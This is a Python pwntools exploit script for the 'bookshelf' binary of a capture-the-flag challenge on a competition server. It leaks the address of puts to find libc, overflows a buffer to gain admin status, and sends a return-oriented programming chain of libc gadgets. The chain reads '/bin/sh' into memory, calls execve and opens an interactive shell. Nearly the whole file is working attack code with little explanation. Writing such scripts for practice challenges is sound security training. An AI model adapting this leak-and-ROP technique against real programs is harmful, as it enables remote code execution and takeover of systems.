#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template '--host=chal.pctf.competitivecyber.club' '--port=4444' ./bookshelf
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './bookshelf')

libc_path="./libc.so.6"
if args.LIBC:
 os.environ['LD_PRELOAD'] = libc_path

libc = ELF(libc_path)
os.environ['LD_LIBRARY_PATH'] = '.'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'chal.pctf.competitivecyber.club'
port = int(args.PORT or 4444)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
#tbreak main
break *0x401634
continue
'''.format(**locals())

prompt = '>'

def get_puts_addr(io):
    for i in range(8):
        io.sendline('2')
        io.recvuntil('====')
        io.sendline('2')
        #io.recvuntil('y/N')
        io.sendline('y')
        io.recvuntil('Check out')

    io.sendline('2')
    io.recvuntil('====')
    io.sendline('3')
    io.recvuntil('s glory 0x')
    puts_leak = io.recvuntil(' ')
    puts_addr = int(puts_leak, 16)
    print(f'PUTS: {puts_addr:#x}')
    io.sendline('y')
    io.recvuntil('Check out')

    return puts_addr

def upgrade_to_admin(io):
    io.sendline('1')
    io.recvuntil('authors')
    io.sendline('y')
    io.sendline('A'*38)
    io.recvuntil('Check out')


#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
PUT_OFFSET = 0x80ed0

io = start()
io.recvuntil('Check out')
puts_addr = get_puts_addr(io)
upgrade_to_admin(io)

io.sendline('3') #I'm an admin now...
io.recvuntil('...')

print(f'LEAK_PUTS: {puts_addr:#x}')
libc_base = puts_addr-PUT_OFFSET
print(f'LEAK_LIBC_BASE: {puts_addr-PUT_OFFSET:#x}')
GAD_POP_RAX = libc_base + 0x45eb0        #: pop rax; ret; 
GAD_POP_RDI = libc_base + 0x2a3e5        #: pop rdi; ret;
GAD_POP_RSI = libc_base + 0x2be51        #: pop rsi; ret;
GAD_POP_RDX = libc_base + 0x11f497       #: pop rdx; pop r12; ret; 
GAD_SYSCALL = libc_base + 0x91396        #: syscall; ret; 

payload  = b'A'*48
payload += p64(0x0) #rbp
payload += p64(GAD_POP_RAX)
payload += p64(0)
payload += p64(GAD_POP_RDI)
payload += p64(0)
payload += p64(GAD_POP_RSI)
payload += p64(0x0000000000404100)
payload += p64(GAD_POP_RDX)
payload += p64(0x44444444)
payload += p64(0x44444444)
payload += p64(GAD_SYSCALL)



payload += p64(GAD_POP_RAX)
payload += p64(59)
payload += p64(GAD_POP_RDI)
payload += p64(0x0000000000404100)
payload += p64(GAD_POP_RSI)
payload += p64(0)
payload += p64(GAD_POP_RDX)
payload += p64(0)
payload += p64(0x44444444)
payload += p64(GAD_SYSCALL)




io.sendline(payload)

io.sendline('/bin/sh\x00')

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

